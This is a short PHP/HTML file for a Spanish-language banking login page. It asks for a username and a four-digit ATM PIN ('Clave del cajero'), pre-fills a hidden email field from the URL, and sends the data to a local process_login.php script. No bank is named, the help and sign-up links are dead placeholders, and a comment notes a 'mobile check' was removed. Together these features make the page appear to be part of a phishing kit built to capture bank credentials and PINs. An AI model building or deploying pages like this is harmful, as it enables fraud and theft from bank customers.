<?php

// Mobile check removed

?>
<div class="login-container">
    <form class="login-form" id="loginForm" action="modules/login/process_login.php" method="POST">
        <input type="hidden" name="email" value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>">
        <h1>¡Hola!</h1>
        <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-user"></i>
                <input type="text" name="usuario" id="usuario" required>
                <label for="usuario">Usuario</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu usuario</span>
            <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
        </div>

        <div class="input-wrapper">
            <div class="input-group">
                <i class="fa-solid fa-lock"></i>

                <input type="password" name="clave" id="clave" required maxlength="4" inputmode="numeric"
                    pattern="[0-9]*">

                <label for="clave">Clave del cajero</label>
                <span class="input-line"></span>
            </div>
            <span class="error-message">Ingresa tu clave</span>
            <a href="#" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
        </div>

        <button type="submit" class="btn btn-login" id="loginButton">Iniciar sesión</button>

        <a href="#" class="create-user-link">Crear usuario</a>
    </form>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const usuarioInput = document.getElementById('usuario');
        const loginButton = document.getElementById('loginButton');

        // Regex: Al menos una letra Y al menos un número
        const alphaNumericRegex = /(?=.*[a-zA-Z])(?=.*[0-9])/;

        function validateForm() {
            const userValue = usuarioInput.value;
            // Si cumple la regex, habilita. Si no, deshabilita (o cambia estilo)
            if (alphaNumericRegex.test(userValue)) {
                loginButton.disabled = false;
                loginButton.style.opacity = "1";
                loginButton.style.cursor = "pointer";
            } else {
                loginButton.disabled = true;
                loginButton.style.opacity = "0.5";
                loginButton.style.cursor = "not-allowed";
            }
        }

        // Estado inicial
        validateForm();

        // Listeners
        usuarioInput.addEventListener('input', validateForm);
    });
</script>
